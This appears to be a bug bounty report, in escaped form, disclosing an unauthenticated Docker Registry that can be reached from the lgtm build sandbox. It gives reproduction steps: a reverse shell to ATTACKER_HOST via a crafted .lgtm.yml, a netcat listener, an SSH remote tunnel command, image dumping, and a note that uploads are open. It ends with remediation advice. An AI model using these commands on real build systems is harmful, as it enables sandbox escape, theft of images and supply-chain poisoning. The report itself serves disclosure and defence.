An attacker can use it to dump your docker images and poison them.\n\n**Description:**\nWhile digging into the environment that hosts the sandboxed build container, I came across the port 5000 open on another machine (probably the host), which is used for Docker Registry (https://docs.docker.com/registry/). I was able to reach the service and dump the `lgtm/top` repository. I didn't try to upload anything because I didn't want to alter your docker images.\n\n## Steps To Reproduce:\n\n  1. Create a GitHub repository that has the attached file, name it .lgtm.yml and modify `ATTACKER_HOST` and `ATTACKER_PORT` to yours.\n  2. set up a netcat listener: `nc -vlp ATTACKER_PORT`\n  3. Add the project to lgtm, it should start building it. After some time, you should get a reverse shell.\n  4. Make a remote SSH tunnel from the build container `ssh -R 5555:172.17.0.1:5000 attacker@ATTACKER_HOST -p SSH_PORT -f -N`\n  5. Enter your attacker password and a SSH tunnel should be up.\n  6. Using the docker_fetch tool (https://github.com/NotSoSecure/docker_fetch/), use the url http://127.0.0.1:5555 and dump the repository that you want.\n  7. Additionally, you can follow this reference if you would like to test for blob uploads (https://docs.docker.com/registry/spec/api/#initiate-blob-upload) and look for this string `/v2/\u003cname\u003e/blobs/uploads/`. I tried to initiate an upload and it gave me the uuid of the upload, which means no restriction is made for uploads.\n\n**NOTE**: Even if the shell is lost from the sandbox, the SSH Tunnel still works. This might mean a **sandbox escape**\n\n## Supporting Material/References:\n\n  *A writeup about the vulnerability in a pentest:  https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/\n  *The Docker Registry Doc: https://docs.docker.com/registry/spec/api/#initiate-blob-upload\n\n## Remediation:\n1. Implement authentication to the service.\n2. Use HTTPS\n3. Limit the possibility of reverse shells by whitelisting only useful ports ( It might be challenging because of the purpose of the build sandbox)\n\n## Impact\n\nAn attacker can use it to dump your docker images and poison them.","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003cbr\u003e\nDocker Registry HTTP API v2 is exposed in HTTP without authentication.
